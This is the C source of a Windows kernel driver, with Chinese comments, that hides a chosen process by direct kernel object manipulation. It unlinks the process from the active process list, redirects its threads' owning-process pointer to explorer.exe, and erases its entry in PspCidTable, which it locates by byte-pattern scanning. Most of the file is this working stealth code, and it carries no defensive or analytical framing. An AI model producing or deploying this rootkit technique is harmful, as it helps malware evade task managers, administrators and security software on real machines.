#include "DriverEntry.h"

#pragma warning(disable:4189 4100)


/*
	1. 修改了activeprocesslisthead
	2. 修改  ethread的进程指向了另外的进程
	3. 抹去pscidtable中的值
*/


//需要隐藏进程pid
#define HIDE_PID 2860
//explorer进程pid
#define EXPLORER_PID 1860

PEPROCESS       pEProcessHide;
PEPROCESS       pEprocessExplorer;
PLIST_ENTRY     threadLink;
PLIST_ENTRY     hideActiveProcessLink;
ULONG*          addressOfObjInPspCidTable;

NTSTATUS EnumTable1(ULONG uTableCode)
{
	ULONG               uIndex = 1;
	PHANDLE_TABLE_ENTRY pHandleTableEntry = NULL;

	pHandleTableEntry = (PHANDLE_TABLE_ENTRY)((ULONG)(*(PULONG)uTableCode) + 8);
	for (uIndex = 1; uIndex < 0x200; uIndex++)
	{
		if (pHandleTableEntry->_unUse1.Object != NULL)
		{
			PEPROCESS pCurEProcess = (PEPROCESS)(((ULONG)pHandleTableEntry->_unUse1.Object) & 0xFFFFFFF8);
			if (pEProcessHide == pCurEProcess)
			{
				*(ULONG*)pHandleTableEntry = (ULONG)0x00000000;
				addressOfObjInPspCidTable = (ULONG*)pHandleTableEntry;
				return STATUS_SUCCESS;
			}
		}
		pHandleTableEntry++;
	}
	return STATUS_UNSUCCESSFUL;
}

NTSTATUS EnumTable2(ULONG uTableCode)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	do
	{
		status = EnumTable1(uTableCode);
		if (NT_SUCCESS(status))
		{
			return status;
		}
		uTableCode += 4;
	} while (*(PULONG)uTableCode != 0);
	return status;
}

NTSTATUS EnumTable3(ULONG uTableCode)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	do
	{
		status = EnumTable2(uTableCode);
		if (NT_SUCCESS(status))
		{
			return status;
		}
		uTableCode += 4;
	} while (*(PULONG)uTableCode != 0);
	return status;
}

ULONG GetPspCidTableValue()
{
	PVOID           pPsLookupProcessByProcessIdAddress = NULL;
	ULONG           ulPspCidTableValue = 0;
	ULONG           uIndex = 0;
	UNICODE_STRING  ustrFuncName;

	RtlInitUnicodeString(&ustrFuncName, L"PsLookupProcessByProcessId");
	pPsLookupProcessByProcessIdAddress = MmGetSystemRoutineAddress(&ustrFuncName);
	if (pPsLookupProcessByProcessIdAddress == NULL)
	{
		return ulPspCidTableValue;
	}
	KdPrint(("PsLookupProcessByProcessId->%08X", pPsLookupProcessByProcessIdAddress));
	for (uIndex = 0; uIndex < 0x1000; uIndex++)
	{
		if (*((PUCHAR)((ULONG)pPsLookupProcessByProcessIdAddress + uIndex)) == 0x8B &&
			*((PUCHAR)((ULONG)pPsLookupProcessByProcessIdAddress + uIndex + 1)) == 0x3D &&
			*((PUCHAR)((ULONG)pPsLookupProcessByProcessIdAddress + uIndex + 6)) == 0xE8)
		{
			KdPrint(("Found PspCidTable OK!!"));
			ulPspCidTableValue = *((PULONG)((ULONG)pPsLookupProcessByProcessIdAddress + uIndex + 2));
			break;
		}
	}
	return ulPspCidTableValue;
}

NTSTATUS EnumPspCidTable()
{
	ULONG           uFlag = 0;
	ULONG           uTableCode = 0;
	ULONG           ulPspCidTable = 0;
	NTSTATUS        status = STATUS_SUCCESS;
	PHANDLE_TABLE   pHandleTable = NULL;

	ulPspCidTable = GetPspCidTableValue();
	if (ulPspCidTable == 0)
	{
		return STATUS_UNSUCCESSFUL;
	}

	pHandleTable = (PHANDLE_TABLE)(*(PULONG)ulPspCidTable);
	KdPrint(("pHandleTable->%p", pHandleTable));

	uTableCode = (pHandleTable->TableCode) & 0xFFFFFFFC;
	uFlag = (pHandleTable->TableCode) & 0x03;
	KdPrint(("uTableCode->%08X", uTableCode));

	switch (uFlag)
	{
	case 0:
	{
			  status = EnumTable1(uTableCode);
			  break;
	}
	case 1:
	{
			  status = EnumTable2(uTableCode);
			  break;
	}
	case 2:
	{
			  status = EnumTable3(uTableCode);
			  break;
	}
	}
	return status;
}

NTSTATUS hide_process_by_pid(ULONG  pid_hide)
{
	PLIST_ENTRY curItem;
	PKTHREAD    pKthread;
	BOOLEAN     isFound = FALSE;
	NTSTATUS    status = STATUS_SUCCESS;

	status = PsLookupProcessByProcessId((HANDLE)pid_hide, &pEProcessHide);
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = PsLookupProcessByProcessId((HANDLE)EXPLORER_PID, &pEprocessExplorer);
	if (!NT_SUCCESS(status))
	{
		return status;
	}

	threadLink = (PLIST_ENTRY)((char*)pEProcessHide + 0x188);
	if (!MmIsAddressValid(threadLink))
	{
		KdPrint(("threadLink found err"));
		return STATUS_UNSUCCESSFUL;
	}

	hideActiveProcessLink = (PLIST_ENTRY)((char*)pEProcessHide + 0x0b8);
	if (!MmIsAddressValid(hideActiveProcessLink))
	{
		KdPrint(("activeProcessLink found err"));
		return STATUS_UNSUCCESSFUL;
	}

	//遍历进程中的线程，修改线程中eprocess指针，使其指向explorer
	curItem = threadLink->Flink;
	while (curItem)
	{
		pKthread = (PKTHREAD)((char*)curItem - 0x268);
		if (MmIsAddressValid(pKthread))
		{
			*(ULONG*)((char*)pKthread + 0x150) = (ULONG)pEprocessExplorer;
		}
		curItem = curItem->Flink;
		if (curItem == threadLink->Flink)
		{
			break;
		}
	}

	//断activeProcessLink链表
	hideActiveProcessLink->Blink->Flink = hideActiveProcessLink->Flink;
	hideActiveProcessLink->Flink->Blink = hideActiveProcessLink->Blink;

	//抹去PspCidTable中隐藏进程的eprocess地址
	status = EnumPspCidTable();
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	PKTHREAD    pKthread;
	PLIST_ENTRY curItem;
	PLIST_ENTRY activeProcessLink;
	PLIST_ENTRY activeProcessLinkNext;

	//恢复PspCidTable
	if (MmIsAddressValid(addressOfObjInPspCidTable))
	{
		*addressOfObjInPspCidTable = (ULONG)pEProcessHide | 0x00000001;
	}

	//恢复活动进程链
	activeProcessLink = (PLIST_ENTRY)((char*)pEprocessExplorer + 0x0b8);
	activeProcessLinkNext = activeProcessLink->Flink;
	//循环链表的插入
	activeProcessLink->Flink = hideActiveProcessLink;
	hideActiveProcessLink->Blink = activeProcessLink;
	hideActiveProcessLink->Flink = activeProcessLinkNext;
	activeProcessLinkNext->Blink = hideActiveProcessLink;

	//恢复线程中eprocess指针
	if (MmIsAddressValid(threadLink))
	{
		curItem = threadLink->Flink;
		while (curItem)
		{
			pKthread = (PKTHREAD)((char*)curItem - 0x268);
			if (MmIsAddressValid(pKthread))
			{
				*(ULONG*)((char*)pKthread + 0x150) = (ULONG)pEProcessHide;
			}
			curItem = curItem->Flink;
			if (curItem == threadLink->Flink)
			{
				break;
			}
		}
	}
	KdPrint(("DriverUnload"));
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath)
{
	DbgBreakPoint();
	pDriverObject->DriverUnload = DriverUnload;
	KdPrint(("DriverEntry"));
	return hide_process_by_pid(HIDE_PID);
}
